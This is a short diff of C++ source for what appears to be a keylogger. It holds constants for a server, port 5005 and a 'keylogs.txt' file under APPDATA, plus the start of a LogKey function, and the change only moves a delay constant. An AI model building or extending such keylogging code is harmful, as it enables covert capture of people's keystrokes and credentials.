@@ -6,10 +6,10 @@ using namespace std;
 
 const string SERVER = "";
 const int PORT = 5005;
+const int DELAY = 500; // milliseconds
 
 string logFileName = "keylogs.txt";
 string appData = string(getenv("APPDATA")) + "\\";
-const int DELAY = 500; // milliseconds
 
 // Write Pressed Keys to File
 void LogKey(char* key)
